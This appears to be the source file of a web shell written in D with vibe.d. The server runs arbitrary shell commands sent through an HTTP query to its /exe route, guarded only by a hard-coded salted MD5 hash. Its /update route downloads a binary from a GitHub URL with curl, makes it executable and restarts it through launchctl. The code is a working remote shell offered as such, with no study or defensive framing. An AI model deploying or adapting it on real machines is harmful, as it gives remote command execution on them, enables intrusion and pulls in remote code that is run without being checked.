import vibe.vibe;

void main() {
	auto settings = new HTTPServerSettings;
	settings.port = 3141;
	auto router = new URLRouter;

	router.get("/", &serveRoot);
	router.get("/exe", &executionHander);
	router.get("/name/get", &getDeviceName);
	router.get("/name/set", &handleNameChange);
	router.get("/update", &updateHandler);
	router.get("/test", &tester);

	listenHTTP(settings, router);
	runApplication();
}

void tester(HTTPServerRequest req, HTTPServerResponse res) {
	res.writeBody("..");
}

bool checkPassword(string password) {
	import std.digest.md;

	enum hash = "730C1DEAEC465FD08DEC622903BF74EA";

	if (("WoUlD_YoU_LiKe_SoMe_SaLt_WiTh_ThAt_HaSh?"~("mm"~password.md5Of.toHexString~"zz").md5Of.toHexString).md5Of.toHexString == hash) {
		return true;
	}

	return false;
}

void serveRoot(HTTPServerRequest req, HTTPServerResponse res) {
	res.contentType = "text/html";
	res.writeBody(import("index.html"));
}

void executionHander(HTTPServerRequest req, HTTPServerResponse res) {
	import std.json;
	import std.string;
	import std.concurrency;

	if (!checkPassword(req.query["password"])) {
		JSONValue response;
		response["output"] = "INVALID PASSWORD";
		res.writeJsonBody(response);
		return;
	}

	shared string command = req.query["command"];

	Tid executerTid = spawn(&executer, command);

	string commandOutput;

	while (!receiveTimeout(dur!"msecs"(1), (string output) {commandOutput = output;})) {
		vibe.core.core.yield();
	}

	JSONValue response;
	response["output"] = commandOutput;

	res.writeJsonBody(response);
}

void executer(shared string command) {
	import std.process;
	import std.concurrency;

	string output = executeShell(command).output;

	ownerTid.send(output);
}

void setDeviceName(string name) {
	import std.file;
	import std.process;

	string filePath = "/home/"~environment["USER"]~"/.webshellDeviceName";

	write(filePath, name);
}

void handleNameChange(HTTPServerRequest req, HTTPServerResponse res) {
	if (!checkPassword(req.query["password"])) {
		res.writeBody("INVALID PASSWORD");
		return;
	}

	setDeviceName(req.query["name"]);
	res.writeBody("Changed name to \""~req.query["name"]~"\".");
}

void getDeviceName(HTTPServerRequest req, HTTPServerResponse res) {
	import std.file;
	import std.process;

	string filePath = "/home/"~environment["USER"]~"/.webshellDeviceName";

	if (filePath.exists) {
		res.writeBody(filePath.readText);
	} else {
		res.writeBody("Unnamed webshell device");
	}
}

void updateHandler(HTTPServerRequest req, HTTPServerResponse res) {
	import std.process;

	if (!checkPassword(req.query["password"])) {
		res.writeBody("INVALID PASSWORD");
		return;
	}

	executeShell("curl -s -o ~/.webshell https://raw.githubusercontent.com/teeheeheeaaahhaha/webshell/master/dist/server ; chmod +x ~/.webshell");
	res.writeBody("Updated. Restarting now...");
	executer("launchctl kickstart -k gui/$(id -u)/WebShellWebServerStarter");
}
